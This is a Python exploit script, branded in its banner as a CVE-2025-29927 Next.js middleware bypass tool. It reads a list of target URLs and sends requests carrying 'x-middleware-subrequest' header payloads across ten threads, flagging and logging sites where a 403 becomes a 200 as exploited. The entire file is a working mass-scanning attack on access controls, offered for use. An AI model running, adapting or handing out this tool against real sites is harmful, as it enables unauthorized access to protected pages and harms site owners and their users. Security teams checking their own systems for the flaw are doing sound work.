import sys
import requests
from concurrent.futures import ThreadPoolExecutor

requests.packages.urllib3.disable_warnings()

RED = "\033[91m"
GREEN = "\033[92m"
BLUE = "\033[94m"
RESET = "\033[0m"

confirmed_bypass = []
difference_only = []

middleware_payloads = [
    "middleware",
    "pages/_middleware",
    "src/middleware",
    "middleware:middleware:middleware:middleware:middleware",
    "src/middleware:src/middleware:src/middleware:src/middleware:src/middleware"
]

def banner():
    print(rf"""

   ___       __  __ _     _     _ _                              
  / _ \     |  \/  (_)   | |   | | |                             
 | | | |_  _| \  / |_  __| | __| | | _____      ____ _ _ __ ___  
 | | | \ \/ / |\/| | |/ _` |/ _` | |/ _ \ \ /\ / / _` | '__/ _ \ 
 | |_| |>  <| |  | | | (_| | (_| | |  __/\ V  V / (_| | | |  __/ 
  \___//_/\_\_|  |_|_|\__,_|\__,_|_|\___| \_/\_/ \__,_|_|  \___| 
                                                                                                                                                             
                   CVE-2025-29927 Exploit
            Next.js Middleware Bypass Vulnerability
                        {RED}by 0x0luk{RESET}
    """)

def check_middleware_bypass(url):
    try:
        response_normal = requests.get(url, timeout=5, verify=False)
    except Exception:
        return

    for payload in middleware_payloads:
        try:
            headers = {"x-middleware-subrequest": payload}
            response_bypass = requests.get(url, headers=headers, timeout=5, verify=False)

            if response_normal.status_code == 403 and response_bypass.status_code == 200:
                colored_url = f"{BLUE}{url}{RESET}"
                print(f"{GREEN}[✔] Exploited:{RESET} {colored_url} {RED}(payload: {payload}){RESET}")
                confirmed_bypass.append(f"{url} [payload: {payload}]")
                with open("middleware_bypass_confirmed.txt", "a") as f:
                    f.write(f"{url} [payload: {payload}]\n")
                continue  

            elif response_normal.text != response_bypass.text:
                print(f"{BLUE}[•] {RESET}Response difference:{BLUE} {url} {RED}(payload: {payload}){RESET}")
                difference_only.append(f"{url} [payload: {payload}]")
                with open("middleware_response_diff.txt", "a") as f:
                    f.write(f"{url} [payload: {payload}]\n")
                continue 

        except Exception:
            continue

def main():
    if len(sys.argv) < 2:
        print(f"{RED}[!] {RESET}Usage: python3 middleware_bypass_checker.py <urls.txt>{RESET}")
        sys.exit(1)

    banner()

    url_list_file = sys.argv[1]
    print(f"{BLUE}[•] {RESET}Loading URLs from:{BLUE} {url_list_file}{RESET}")

    with open(url_list_file, "r") as f:
        urls = [line.strip() for line in f if line.strip()]

    print(f"{BLUE}[•] {RESET}Starting scan on {BLUE}{len(urls)}{RESET} targets...{RESET}\n")

    with ThreadPoolExecutor(max_workers=10) as executor:
        executor.map(check_middleware_bypass, urls)

    print(f"\n{BLUE}[•] {RESET}Scan completed.{RESET}")

    if confirmed_bypass:
        print(f"{GREEN}[✔] {RESET}Found {len(confirmed_bypass)} bypass hits > middleware_bypass_confirmed.txt{RESET}")
    if difference_only:
        print(f"{BLUE}[•] {RESET}Found {len(difference_only)} response diffs > middleware_response_diff.txt{RESET}")
    if not confirmed_bypass and not difference_only:
        print(f"{RED}[!] {RESET}No vulnerable URLs found ;-;{RESET}")

if __name__ == "__main__":
    main()
